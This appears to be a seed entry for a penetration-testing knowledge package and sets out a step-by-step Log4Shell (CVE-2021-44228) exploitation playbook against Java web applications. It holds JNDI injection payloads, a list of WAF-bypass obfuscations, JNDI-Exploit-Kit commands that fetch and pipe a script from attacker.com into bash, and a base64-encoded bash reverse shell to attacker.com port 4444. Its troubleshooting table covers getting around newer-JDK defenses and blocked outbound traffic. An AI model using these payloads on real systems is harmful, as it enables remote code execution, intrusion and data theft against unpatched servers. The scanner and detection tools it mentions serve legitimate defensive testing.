# [Seed] Log4Shell (CVE-2021-44228) JNDI injection hits RCE

## Scene classification
Penetration Testing/Web RCE

## Goal Overview
A Java web application uses an affected version of Log4j2 (< 2.17.0). When any user-controllable field is logged, JNDI remote loading is triggered, and the LDAP/RMI service is constructed to push a malicious class to obtain the execution permission of the target machine.

## Complete execution link

1. Target recognition
- HTTP headers `Server`, `X-Powered-By` include Java application framework (Tomcat/Spring/Liferay)
- Version fingerprint: login page, 404 page, path leakage
- Vulnerability confirmation: Send detection payload through any field that can be logged (User-Agent, Referer, X-Forwarded-For, login user name, search box)
2. Prepare OOB monitoring
- DNSLog platform (dnslog.cn / interactsh / Burp Collaborator)
- Self-built LDAP service (marshalsec / JNDI-Exploit-Kit)
3. Detect whether there are vulnerabilities
```
${jndi:ldap://abc123.dnslog.cn/x}
```
Insert into User-Agent and other fields, and the DNSLog platform will confirm after receiving the `abc123.dnslog.cn` resolution record.
4. Start using services (self-built public network VPS or ngrok reverse generation)
```bash
java -jar JNDI-Exploit-Kit.jar -L 0.0.0.0:1389 -P 0.0.0.0:8888 -C 'curl http://attacker.com/sh|bash'
```
5. Trigger the exploit payload
```
${jndi:ldap://attacker.com:1389/Basic/Command/base64/Y3VybCBodHRwOi8vYXR0YWNrZXIuY29tL3NofGJhc2g=}
```
6. Get the reverse shell → follow the attack-chain for subsequent privilege escalation/persistence

## Trampling on pit records

| Problem | Cause | Solution | Time consuming |
|------|------|---------|------|
| Detection payload has no DNS backlink | The target is on the internal network and has no external network | Use DNS-only OOB such as oast.online, or test the internal DNSLog | 1h |
| DNS is resolved but LDAP is blocked | Outbound policy only puts DNS | Use DNS Exfiltration to directly bring out data without going through LDAP | 1.5h |
| LDAP passes but the target does not load the class | JDK high version (8u191+/11.0.1+/...) defaults to `com.sun.jndi.ldap.object.trustURLCodebase=false` | Use local gadget chains such as `Tomcat` / `Groovy` / `BeanFactory` instead (no remote class loading required) | 3h |
| Double quotes are escaped / payload is blocked by WAF | Various ${} nesting bypasses existing rules | Use `${${::-j}ndi:...}` / `${${lower:j}ndi:...}` / `${env:xx:-jndi}` nesting to bypass | 1h |
| The vulnerability is triggered but the shell cannot be obtained | The command containing special characters is destroyed in Runtime.exec | Use base64 to encode one layer of the package: `bash -c {echo,base64}|{base64,-d}|bash` | 30min |
| Spring Boot application does not reappear | Spring uses Logback instead of Log4j2 | Check the dependency tree to see if spring-boot-starter-log4j2 is introduced | 20min |

## Toolchain discovery

- **JNDI-Exploit-Kit** (welk1n / pimps) enables LDAP+RMI+HTTP with one click, supports local gadget bypass
- **JNDI-Injection-Exploit** old version, supports more gadgets but has been discontinued
- **Nuclei** template `cves/2021/CVE-2021-44228.yaml` is suitable for scanning whether assets are affected
- **interactsh-client** Produced by ProjectDiscovery, self-built OOB is more private than dnslog.cn
- **CrowdStrike CVE-2021-44228 scanner** detects JndiLookup.class at the binary level

## Key code/command

WAF bypass payload collection:

```text
${jndi:ldap://x.dnslog.cn/a} # Basics
${${::-j}ndi:ldap://x.dnslog.cn/a} # Nesting
${${lower:j}ndi:ldap://x.dnslog.cn/a}           # lower
${${upper:j}ndi:ldap://x.dnslog.cn/a}           # upper
${${env:NaN:-j}ndi:ldap://x.dnslog.cn/a}        # env fallback
${jndi:${lower:l}${lower:d}a${lower:p}://...} # Ultimate word splitting
${jndi:dns://x.dnslog.cn} # DNS channel
${jndi:rmi://attacker.com:1099/a} # RMI replacement for LDAP
```

interactsh starting service:

```bash
interactsh-client -v
# Output: abc123.oast.online ← Replace the dnslog in the payload with this domain
```

JNDI-Exploit-Kit one-click exploitation:

```bash
java -jar JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar \
  -L attacker.com:1389 \
  -P attacker.com:8888 \
  -C 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vNDQ0NCAwPiYx}|{base64,-d}|bash'
# Output multiple usable payloads and choose one to insert into the target
```

## Suggestions for improving this package

- `pentest-tools/references/log4shell-bypass-payloads.md` creates a separate file and concentrates 50+ bypass payloads
- The nucleic template comes with it → reminds the user `nuclei -t cves/2021/CVE-2021-44228.yaml -l targets.txt`
- attack-chain adds the standard action list "after entering the intranet through Log4Shell"

## Reusable patterns/script snippets

**Log4Shell three-stage detection method**:

```text
1. Send multiple fields in batches ${jndi:ldap://oob/a} → Check whether there is a return connection on the OOB platform
2. There is a back connection → start the local gadget LDAP (does not rely on remote class loading) → push the payload
3. No return connection → switch to DNS channel for out-of-band data transfer
```

**Key Judgment**:

```text
- DNSLog receives connection return but LDAP fails → Higher version of JDK, local gadget must be used
- DNS is not accessible → Intranet OOB / second-order reflection (first hit the second-level system that can get out of the network)
- Commands with special characters do not respond → base64 packaging
```

## Evolution action
- [x] Routing matrix already has "Log4j" / "JNDI injection" keywords
- [ ] Create log4shell-bypass-payloads.md separately
- [ ] bootstrap manifest added interactsh-client

## Environment information
- Attack machine: Kali, Java 8 (running LDAP service)
- OOB platform: dnslog.cn / oast.online / self-built interactsh
- Target: Any Java Web with Log4j2 < 2.17.0

## Desensitization requirements
This entry is seed data, written based on public CVE information and does not involve real production targets. All domain names/IPs are placeholder examples.